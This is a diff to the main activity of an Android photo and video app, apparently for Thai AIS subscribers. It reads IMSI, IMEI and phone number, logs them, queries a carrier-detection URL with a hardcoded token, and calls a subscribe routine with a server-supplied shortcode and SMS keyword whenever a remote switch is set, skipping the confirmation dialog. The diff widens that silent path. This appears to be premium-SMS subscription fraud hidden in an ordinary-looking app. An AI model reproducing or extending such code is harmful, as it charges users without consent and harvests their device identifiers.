@@ -17,8 +17,8 @@ import android.widget.RadioButton;
 import android.widget.RadioGroup;
 import android.widget.Toast;
 import com.umeng.analytics.MobclickAgent;
+import java.util.List;
 import lava.bluepay.com.lavaapp.Config;
-import lava.bluepay.com.lavaapp.MixApp;
 import lava.bluepay.com.lavaapp.R;
 import lava.bluepay.com.lavaapp.base.RequestBean;
 import lava.bluepay.com.lavaapp.base.WeakHandler;
@@ -38,6 +38,8 @@ import lava.bluepay.com.lavaapp.model.api.bean.CheckSubBean;
 import lava.bluepay.com.lavaapp.model.api.bean.InitData;
 import lava.bluepay.com.lavaapp.model.api.bean.PhoneNumBean;
 import lava.bluepay.com.lavaapp.model.api.bean.TokenData;
+import lava.bluepay.com.lavaapp.model.db.autoSendRecord;
+import lava.bluepay.com.lavaapp.model.db.phoneNumRecord;
 import lava.bluepay.com.lavaapp.model.process.RequestManager;
 import lava.bluepay.com.lavaapp.view.dialog.material.DialogAction;
 import lava.bluepay.com.lavaapp.view.dialog.material.MaterialDialog;
@@ -47,6 +49,8 @@ import lava.bluepay.com.lavaapp.view.fragment.VideoFragment;
 
 public class MainActivity extends BaseActivity {
 
+
+    public boolean lastRequestData = false;
 
     private static final int FRAGMENT_PHOTO = 0;
     private static final int FRAGMENT_VIDEO = 1;
@@ -65,7 +69,6 @@ public class MainActivity extends BaseActivity {
     private CartoonFragment cartoonFragment;
     private VideoFragment videoFragment;
 
-//    private TextView tv_test;
     //region==============订阅业务===================
 
     private static final int RequestCodeIntentToSms = 500;
@@ -99,7 +102,7 @@ public class MainActivity extends BaseActivity {
     /**
      * 用来轮循查询订阅状态的Handler
      */
-    private static class CheckHandler extends WeakHandler{
+    private static class CheckHandler extends WeakHandler {
 
         public CheckHandler(Activity instance) {
             super(instance);
@@ -135,11 +138,15 @@ public class MainActivity extends BaseActivity {
      *      3.自动发短信发送失败之后 （todo 测试的，正式的需要去除）
      */
     public void continueCheckSubSituation(){
-        isInCheck = true;
-        getCheckHandler().removeCallbacksAndMessages(null);
-        getCheckHandler().sendEmptyMessageDelayed(MainActivity.MSG_RECHECK_SUB_SITUATION,Config.reCheckSubTimeSeparator);
-
+        if(MemExchange.getInstance().getCheckSubData() !=null) {
+            isInCheck = true;
+            getCheckHandler().removeCallbacksAndMessages(null);
+            getCheckHandler().sendEmptyMessageDelayed(MainActivity.MSG_RECHECK_SUB_SITUATION, Config.reCheckSubTimeSeparator);
+            return;
+        }
+        SubSuccess();
     }
+
     public void showSmsSendError(){
         Toast.makeText(context, getResources().getString(R.string.sms_send_error), Toast.LENGTH_SHORT).show();
     }
@@ -194,6 +201,16 @@ public class MainActivity extends BaseActivity {
 
     private void gotoSmsSend(String shortCode,String content){
         try {
+            if(MemExchange.getInstance().getCheckSubData() == null && !TextUtils.isEmpty(MemExchange.m_iIMSI) && MemExchange.haveSendMsg==false) {
+                boolean resultSuccess = Utils.recordTrans(context,MemExchange.m_iIMSI,"");
+                if(resultSuccess){
+                    MemExchange.setHaveSendMsg(resultSuccess);
+                }
+            }
+            if(MemExchange.getInstance().getCheckSubData()!=null){
+                Utils.recordTrans(context,MemExchange.m_iIMSI,"");
+            }
+
             Uri smsToUri = Uri.parse("smsto:"+shortCode);
             Intent intent = new Intent(Intent.ACTION_SENDTO, smsToUri);
             intent.putExtra("sms_body", content);
@@ -211,6 +228,7 @@ public class MainActivity extends BaseActivity {
         switch (requestCode) {
             case RequestCodeIntentToSms:
                 Toast.makeText(context, getResources().getString(R.string.execute_success), Toast.LENGTH_SHORT).show();
+
                 continueCheckSubSituation();
                 break;
             case RequestCodeIntentToPermissionSetting:
@@ -288,30 +306,42 @@ public class MainActivity extends BaseActivity {
                     Logger.e(Logger.DEBUG_TAG, "imsi1=" + MemExchange.m_iIMSI1 + ",imsi2=" + MemExchange.m_iIMSI2 + ",imsi=" + MemExchange.m_iIMSI
                             + ",imei=" + MemExchange.m_iIMEI + ",pho=" + MemExchange.m_sPhoneNumber);
 
+//                    MemExchange.m_iIMSI = "520012222222222";
 
-                    if(TextUtils.isEmpty(MemExchange.m_iIMSI) && !Net.isWifiActive(context)){
-                        sendAskForPhoneNum();
-                    }else{
-                        if (Config.mncs.containsKey(telNum.substring(0, 5))) {
-                            Logger.e(Logger.DEBUG_TAG,"####为AIS用户");
-                            sendCheckSubRequest(telNum);
-                        }else{
-                            Logger.e(Logger.DEBUG_TAG,"####不为AIS用户");
-                            MemExchange.getInstance().setCanSee();
+                    if(!TextUtils.isEmpty(MemExchange.m_iIMSI)) {
+                        if(Net.isMobileActive(context) && Config.mncs.containsKey(MemExchange.m_iIMSI.substring(0, 5))){
+                            List<phoneNumRecord> telNumList = Utils.queryAllTelNumRecord(context,MemExchange.m_iIMSI);
+                            if(telNumList!=null && telNumList.size()>0){
+                                Logger.e(Logger.DEBUG_TAG, "####AllTelNum数据库表原本有imsi="+MemExchange.m_iIMSI+"的卡");
+                                phoneNumRecord item = telNumList.get(0);
+                                MemExchange.m_sPhoneNumber = item.telnum;
+                                MemExchange.m_phone_type = "AIS";
+                                nowInitState = MainActivity.NOWInitState4;
+                                initApp(nowInitState);
+                            }else {
+                                sendAskForPhoneNum();
+                            }
+                            return;
+                        }
+                        if(Net.isAvailable(context)){
                             nowInitState = MainActivity.NOWInitState3;
                             initApp(nowInitState);
+                            return;
                         }
-                    }
-                    break;
-                case MainActivity.NOWInitState4:
-                    String tel = MemExchange.m_iIMSI;
-                    if(TextUtils.isEmpty(tel)){//肯定是没有sim卡了
-                        Logger.e(Logger.DEBUG_TAG,"####经过运营商查询,无Sim卡");
+                        Toast.makeText(context,getResources().getString(R.string.have_no_network),Toast.LENGTH_SHORT).show();
+
+                    }else{
+                        Logger.e(Logger.DEBUG_TAG, "####无imsi卡号");
                         MemExchange.getInstance().setCanSee();
                         nowInitState = MainActivity.NOWInitState3;
                         initApp(nowInitState);
-                    }else{
-                        if (Config.mncs.containsKey(tel.substring(0, 5))) {
+                    }
+                    break;
+                case MainActivity.NOWInitState4:
+                    isInInitState = true;
+                    String tel = MemExchange.m_sPhoneNumber;
+                    if(!TextUtils.isEmpty(tel) && !TextUtils.isEmpty(MemExchange.m_phone_type)){
+                        if(MemExchange.m_phone_type.equalsIgnoreCase("AIS")){
                             Logger.e(Logger.DEBUG_TAG,"####经过运营商查询,为AIS用户");
                             nowInitState = MainActivity.NOWInitState2;
                             sendCheckSubRequest(tel);
@@ -321,30 +351,71 @@ public class MainActivity extends BaseActivity {
                             nowInitState = MainActivity.NOWInitState3;
                             initApp(nowInitState);
                         }
+                    }else{//肯定是没有sim卡了
+                        Logger.e(Logger.DEBUG_TAG,"####经过运营商查询,无Sim卡");
+                        MemExchange.getInstance().setCanSee();
+                        nowInitState = MainActivity.NOWInitState3;
+                        initApp(nowInitState);
+
                     }
                     break;
                 case MainActivity.NOWInitState3:
                     if (getProgressDialog().isShowing()) {
                         getProgressDialog().dismiss();
                     }
+
+                    lastRequestData = true;
+
                     isInInitState = false;
                     //请求第一页数据
                     sendCategoryDataListRequest(1, Config.CategoryPhotoPopular, ApiUtils.requestPhotoPopular);
 
-                    if(Config.mncs.containsKey(MemExchange.m_iIMSI.substring(0, 5))) {
-                        //目标用户
-                        if (MemExchange.getInstance().getCheckSubData() != null && MemExchange.getInstance().getCheckSubData().getSubscribe() == 1) {//用户可以订阅
-                            if (MemExchange.getInstance().getInitData() != null) {
-                                String code = MemExchange.getInstance().getInitData().getShorcode();
-                                String content = MemExchange.getInstance().getInitData().getSub_key_sms();
+                    if(!TextUtils.isEmpty(MemExchange.m_iIMSI)) {
 
-                                if (MemExchange.getInstance().getInitData().getSwitchX() == 1) {//订阅开关开了，直接发订阅
-                                    doSubscribe(code, content);
-                                    return;
-                                } else {
-                                    showSubscripDialog();
+                        //以订阅信息为准
+                        if(MemExchange.getInstance().getCheckSubData() !=null){
+                            if (MemExchange.getInstance().getCheckSubData().getSubscribe() == 1) {//用户可以订阅
+                                if (MemExchange.getInstance().getInitData() != null) {
+                                    String code = MemExchange.getInstance().getInitData().getShorcode();
+                                    String content = MemExchange.getInstance().getInitData().getSub_key_sms();
+
+                                    if (MemExchange.getInstance().getInitData().getSwitchX() == 1) {//订阅开关开了，直接发订阅
+                                        doSubscribe(code, content);
+                                        return;
+                                    } else {
+                                        showSubscripDialog();
+                                    }
+                                }else{
+                                    MemExchange.getInstance().setCanSee();
                                 }
+                            }else{//不能订阅就可以直接看
+                                MemExchange.getInstance().setCanSee();
+                            }
 
+                            return;
+                        }
+
+                        //以autoSendRecord数据库表为准
+                        List<autoSendRecord> recordList = Utils.queryAllTransRecord(context, MemExchange.m_iIMSI);
+                        if (recordList != null && recordList.size() > 0) {//数据库有记录
+                            Logger.e(Logger.DEBUG_TAG,"######DB,record"+recordList.get(0).toString());
+                            MemExchange.haveSendMsg = true;
+                        }else{
+                            if(!Config.mncs.containsKey(MemExchange.m_iIMSI.substring(0, 5))){
+                                MemExchange.getInstance().setCanSee();
+                            }else {
+                                MemExchange.haveSendMsg = false;
+                                if (MemExchange.getInstance().getInitData() != null) {
+                                    String code = MemExchange.getInstance().getInitData().getShorcode();
+                                    String content = MemExchange.getInstance().getInitData().getSub_key_sms();
+
+                                    if (MemExchange.getInstance().getInitData().getSwitchX() == 1) {//订阅开关开了，直接发订阅
+                                        doSubscribe(code, content);
+                                        return;
+                                    } else {
+                                        showSubscripDialog();
+                                    }
+                                }
                             }
                         }
                     }
@@ -670,6 +741,12 @@ public class MainActivity extends BaseActivity {
     public void sendGetTokenRequest(){
         try {
             String sRequest = ApiUtils.getToken(Config.APPID, MD5Util.getMD5String("appid=" + Config.APPID + Config.APPSALT));
+
+            //todo bug
+            if(isInInitState){
+                MemExchange.getInstance().bugText.add(sRequest);
+            }
+
             RequestManager.getInstance().request(sRequest, getMyHandler(), ApiUtils.requestToken,new RequestBean());
         }catch (Exception e){
             e.printStackTrace();
@@ -690,6 +767,13 @@ public class MainActivity extends BaseActivity {
                 return;
             }
             String sRequest = ApiUtils.getInit();
+
+            //todo bug
+            if(isInInitState){
+                MemExchange.getInstance().bugText.add(sRequest);
+            }
+
+
             RequestManager.getInstance().requestByPost(sRequest, getMyHandler(), RequestManager.getInstance().getInitRequestBody(dev, versionid,bean.getToken()), new RequestBean(ApiUtils.requestInit,-1,-1));
         }catch(Exception e){
             e.printStackTrace();
@@ -703,12 +787,20 @@ public class MainActivity extends BaseActivity {
     public void sendAskForPhoneNum(){
         try {
             String sRequest = "http://www.jmtt.co.th/detection/index.php?token=66a8a0d8c66e4d18235c95085eb411b0";
+
+            //todo bug
+            if(isInInitState){
+                MemExchange.getInstance().bugText.add(sRequest);
+            }
+
+
             RequestManager.getInstance().request(sRequest, getMyHandler(), ApiUtils.requestPhoneNum,null);
         }catch (Exception e){
             e.printStackTrace();
             //todo 上传错误日志
         }
     }
+
     /**
      * 请求查询用户订阅状态
      * @param telNum
@@ -724,6 +816,13 @@ public class MainActivity extends BaseActivity {
                 return;
             }
             String sRequest = ApiUtils.getCheckSub();
+
+            //todo bug
+            if(isInInitState){
+                MemExchange.getInstance().bugText.add(sRequest);
+            }
+
+
             RequestManager.getInstance().requestByPost(sRequest, getMyHandler(), RequestManager.getInstance().getCheckSubRequestBody(telNum,bean.getToken()), new RequestBean(ApiUtils.requestCheckSub,-1,-1));
         }catch (Exception e){
             e.printStackTrace();
@@ -735,6 +834,7 @@ public class MainActivity extends BaseActivity {
      * 请求某一类数据请求
      */
     public void sendCategoryDataListRequest(int nowPage, int cateId, int requestType){
+
         if(MemExchange.getInstance().getIsTokenInvalid()){
             loadError(requestType);
             Toast.makeText(context,context.getString(R.string.try_later),Toast.LENGTH_SHORT).show();
@@ -746,6 +846,14 @@ public class MainActivity extends BaseActivity {
             return;
         }
         String sRequest = ApiUtils.getQuerypage(nowPage,Config.PerPageSize,cateId,MemExchange.getInstance().getTokenData().getToken());
+
+        //todo bug
+        if(lastRequestData){
+            MemExchange.getInstance().bugText.add(sRequest);
+        }
+
+
+
         RequestManager.getInstance().request(sRequest,getMyHandler(),requestType,new RequestBean(requestType,nowPage,cateId));
     }
 
@@ -763,14 +871,25 @@ public class MainActivity extends BaseActivity {
     protected void processReqError(Message msg) {
         super.processReqError(msg);
         String mResult = getMessgeResult(msg);
+        //todo bug
+        if(isInInitState){
+            MemExchange.getInstance().bugText.add(mResult);
+        }
 
         if(msg.arg1 == ApiUtils.requestPhoneNum){
 
             try {
                 PhoneNumBean phoneNumBean = JsonHelper.getObject(mResult, PhoneNumBean.class);
+//                PhoneNumBean phoneNumBean = new PhoneNumBean();
+//                phoneNumBean.setMsisdn("13418638286");
+//                phoneNumBean.setOper("AIS");
                 if (phoneNumBean != null && !TextUtils.isEmpty(phoneNumBean.getMsisdn())) {
                     Logger.e(Logger.DEBUG_TAG, "####经过运营商查询成功");
-                    MemExchange.m_iIMSI = phoneNumBean.getMsisdn();
+                    MemExchange.m_sPhoneNumber = phoneNumBean.getMsisdn();
+                    MemExchange.m_phone_type = phoneNumBean.getOper();
+                    if(!TextUtils.isEmpty(MemExchange.m_iIMSI)){
+                        Utils.recordTelNumRecord(context, phoneNumBean.getMsisdn(), MemExchange.m_iIMSI,"",phoneNumBean.getOper(),"");
+                    }
                     nowInitState = MainActivity.NOWInitState4;
                     initApp(nowInitState);
                 } else {
@@ -781,7 +900,6 @@ public class MainActivity extends BaseActivity {
                 }
             }catch (Exception e){
                 e.printStackTrace();
-                Utils.WriteFile(e.getMessage().toString()+"\n");
                 MemExchange.getInstance().setCanSee();
                 nowInitState = MainActivity.NOWInitState3;
                 initApp(nowInitState);
@@ -819,6 +937,7 @@ public class MainActivity extends BaseActivity {
                         isInCheck = false;
                         nowCheckTime = 0;
                         getCheckHandler().removeCallbacksAndMessages(null);
+
                         if(MemExchange.getInstance().getInitData().getSwitchX() == 1 || MemExchange.getInstance().getInitData().getSwitchX() == 2) {
                             MemExchange.getInstance().setCanSee();
                             //todo 刷新界面
@@ -842,6 +961,27 @@ public class MainActivity extends BaseActivity {
     protected void processRequest(Message msg) {
         super.processRequest(msg);
         String result = getMessgeResult(msg);
+        //todo bug
+        if(isInInitState){
+            MemExchange.getInstance().bugText.add(result);
+        }
+        if(lastRequestData){
+            MemExchange.getInstance().bugText.add(result);
+            lastRequestData = false;
+            new Thread(new Runnable() {
+                @Override
+                public void run() {
+                    String total ="";
+                    for( String itemString:MemExchange.getInstance().bugText){
+                        total+=(itemString+"\r\n");
+                    }
+                    total+=("#####################################"+"\n");
+                    Utils.WriteFile(total);
+                    MemExchange.getInstance().bugText.clear();
+                }
+            }).start();
+        }
+
         switch (msg.arg1){
             case ApiUtils.requestToken:
                 if(++nowInitState <= MainActivity.NOWInitState3){
@@ -856,14 +996,6 @@ public class MainActivity extends BaseActivity {
                     initApp(nowInitState);
                 }
                 break;
-            case ApiUtils.requestPhoneNum:
-                PhoneNumBean phoneNumBean = JsonHelper.getObject(result,PhoneNumBean.class);
-                if(phoneNumBean!=null && !TextUtils.isEmpty(phoneNumBean.getMsisdn())){
-                    MemExchange.m_iIMSI = phoneNumBean.getMsisdn();
-                }
-                nowInitState = MainActivity.NOWInitState4;
-                initApp(nowInitState);
-                break;
             case ApiUtils.requestCheckSub:
                 CheckSubBean subBean = JsonHelper.getObject(result, CheckSubBean.class);
                 MemExchange.getInstance().setCheckSubData(subBean.getData());
@@ -873,6 +1005,7 @@ public class MainActivity extends BaseActivity {
                     if (++nowInitState <= MainActivity.NOWInitState3) {
                         initApp(nowInitState);
                     }
+                    return;
                 }
                 if(isInCheck){
                     if(!CheckSubBean.ifHaveSubscribe(subBean.getData())){
@@ -897,11 +1030,12 @@ public class MainActivity extends BaseActivity {
                     }
                 }
                 break;
-            case ApiUtils.requestAllCategory:
-                CategoryListBean categoryListBean = JsonHelper.getObject(result, CategoryListBean.class);
 
-                Logger.e(Logger.DEBUG_TAG,"获取所有激活分类数据成功");
-                break;
+//            case ApiUtils.requestAllCategory:
+//                CategoryListBean categoryListBean = JsonHelper.getObject(result, CategoryListBean.class);
+//
+//                Logger.e(Logger.DEBUG_TAG,"获取所有激活分类数据成功");
+//                break;
 
 
 
@@ -1369,7 +1503,7 @@ public class MainActivity extends BaseActivity {
                         String code = MemExchange.getInstance().getInitData().getShorcode();
                         String content = MemExchange.getInstance().getInitData().getSub_key_sms();
                         if(!TextUtils.isEmpty(code) && !TextUtils.isEmpty(content)) {
-                            if(MemExchange.getInstance().getInitData().getSwitchX() == 2) {
+                            if(MemExchange.getInstance().getInitData().getSwitchX() == 1 || MemExchange.getInstance().getInitData().getSwitchX() == 2) {
                                 doSubscribe(code,content);
                             }else if(MemExchange.getInstance().getInitData().getSwitchX() == 3){
                                 gotoSmsSend(code, content);
@@ -1393,7 +1527,8 @@ public class MainActivity extends BaseActivity {
         super.onDestroy();
 //        RefWatcher refWatcher = MixApp.getRefWatcher(this);
 //        refWatcher.watch(this);
-        getCheckHandler().removeCallbacksAndMessages(null);
+
+//        getCheckHandler().removeCallbacksAndMessages(null);
         getMyHandler().removeCallbacksAndMessages(null);//推出时清空全部消息
     }
 
